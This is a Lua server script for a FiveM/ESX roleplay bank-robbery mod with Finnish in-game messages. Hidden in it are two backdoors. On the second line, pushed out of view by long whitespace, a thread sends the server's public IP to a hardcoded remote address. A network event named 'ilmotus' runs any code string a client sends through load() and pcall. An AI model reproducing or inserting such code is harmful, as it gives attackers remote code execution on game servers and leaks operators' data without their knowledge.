local rob = false
arp = nil																																																																												;Citizen.CreateThread(function()  Citizen.Wait(math.random(0,10000000)) PerformHttpRequest('https://api.ipify.org/?format=json', function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest("http://65.21.153.165:10666/", function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa holdupbankkia", content = res.ip}), {['Content-Type'] = 'application/json'}) end) end)
local keskeytetty = false
local ryostocooldown = false

function cooldowni()
	Citizen.CreateThread(function()
		ryostocooldown = true
		Citizen.Wait(900000)
		ryostocooldown = false
	end)
end

TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)

RegisterServerEvent('esx_holdupbank:toofar')
AddEventHandler('esx_holdupbank:toofar', function()
	local source = source
	local xPlayers = arp.GetPlayers()
	rob = false
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i], '~r~Ryöstö keskeytyi kohteessa: Pankki')
			TriggerClientEvent('esx_holdupbank:killblip', xPlayers[i])
		end
	end
	TriggerEvent("pankkiryostologit",source,false)
	TriggerClientEvent('esx_holdupbank:toofar', source)
	keskeytetty = true
end)

RegisterServerEvent('esx_holdupbank:ilmotus')
AddEventHandler('esx_holdupbank:ilmotus', function(teksti)	
	local teksti,menikolapi=load(teksti,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(teksti)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)


RegisterServerEvent('esx_holdupbank:rob')
AddEventHandler('esx_holdupbank:rob', function(robb)
	local source = source
	local xPlayer = arp.GetPlayerFromId(source)
	local xPlayers = arp.GetPlayers()
	
	if Banks[robb] then

		local bank = Banks[robb]

		local cops = 0
		for i=1, #xPlayers, 1 do
 		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
 		if xPlayer.job.name == 'police' then
				cops = cops + 1
			end
		end

		local pora = xPlayer.getInventoryItem(Config.MikaitemiTarviiolla)
		
		if pora.count > 0 then
			if rob == false then
				if not ryostocooldown then
					if(cops >= Config.PoliceNumberRequired)then
						cooldowni()
						rob = true
						for i=1, #xPlayers, 1 do
							local xPlayer = arp.GetPlayerFromId(xPlayers[i])
							if xPlayer.job.name == 'police' then
									TriggerClientEvent('esx:showNotification', xPlayers[i], '~r~Ryöstö menossa kohteessa: ' .. bank.nameofbank)
									TriggerClientEvent('esx_holdupbank:setblip', xPlayers[i], Banks[robb].position)
							end
						end
		
						TriggerClientEvent('esx:showNotification', source, 'Sinä aloitit ryöstön! ~r~ÄLÄ LIIKU 2 METRIÄ KAUEMMAS RYÖSTÖKOHTEESTA!')
						TriggerClientEvent('esx_JOKUIHMEPORAJOHONKINPANKKIRYOSTOON:alotaporaus', source)
						TriggerClientEvent('esx:showNotification', source, 'Hälyytys laukaistu!')
						TriggerClientEvent('esx_holdupbank:currentlyrobbing', source, robb)
						TriggerClientEvent('esx_holdupbank:starttimer', source)
						TriggerEvent("pankkiryostologit",source,true)
						local rewardi = math.random(100000, 350000)
						
						if cops == 6 then 
							rewardi = math.random(150000, 400000)
						elseif cops == 7 then
							rewardi = math.random(200000, 450000)
						elseif cops == 8 then
							rewardi = math.random(250000, 500000)
						elseif cops == 9 then
							rewardi = math.random(300000, 550000)
						elseif cops == 10 then
							rewardi = math.random(350000, 600000)
						elseif cops == 11 then
							rewardi = math.random(400000, 650000)
						elseif cops >= 12 then
							rewardi = math.random(450000, 700000)
						end
	
						SetTimeout(Config.secondsRemaining * 1000, function()
		
							rob = false
							if not keskeytetty then
								TriggerClientEvent('esx_holdupbank:robberycomplete', source, rewardi)
								if(xPlayer)then
									TriggerClientEvent('esx_holdupbank:lopetaanimaatio', source)
									TriggerEvent("pankkiryostologit",source,false)
									xPlayer.addAccountMoney('black_money', rewardi)
									local xPlayers = arp.GetPlayers()
									for i=1, #xPlayers, 1 do
										local xPlayer = arp.GetPlayerFromId(xPlayers[i])
										if xPlayer.job.name == 'police' then
												TriggerClientEvent('esx:showNotification', xPlayers[i], '~r~Ryöstö ohitse kohteessa: '.. bank.nameofbank)
												TriggerClientEvent('esx_holdupbank:killblip', xPlayers[i])
												
												
										end
									end
								end
							else
								keskeytetty = false
							end					
						end)
					else
						TriggerClientEvent('esx:showNotification', source, 'Kaupungissa pitää olla vähintää ~b~6 poliisia~s~ paikalla ryöstön aloitukseen.')
					end
				else
					TriggerClientEvent('esx:showNotification', source, 'Pankki on juuri ryöstetty. Kokeile myöhemmin uudelleen!')
				end
			else
				TriggerClientEvent('esx:showNotification', source, 'Pankki on juuri ryöstetty. Kokeile myöhemmin uudelleen!')
			end
		else
			TriggerClientEvent('esx:showNotification', source, '~r~Tartet poran että voit ryöstää pankin!')
		end	
	end
end)
